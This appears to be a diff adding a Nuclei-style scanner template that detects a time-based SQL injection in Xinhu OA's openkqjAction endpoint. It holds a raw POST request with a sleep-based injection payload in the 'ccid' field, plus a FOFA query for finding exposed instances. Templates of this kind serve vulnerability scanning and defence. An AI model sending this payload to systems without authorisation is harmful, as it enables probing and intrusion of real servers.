@@ -1,0 +1,33 @@
+id: rockoa-openkqjaction-sqli
+info:
+  name: 信呼OA openkqjAction SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: xinhu
+    fofa: app="信呼-OA系统"
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) * 2}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"a":{"data":"fingerprint","ccid":"1' or sleep({{t1}})#'","fingerprint":"3"}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "kqjcmdModel.php"
+          - "Undefined index"
+          - "\"info\":\"ok\""
+      - type: dsl
+        dsl:
+          - duration > {{t2}} && duration < {{t3}}
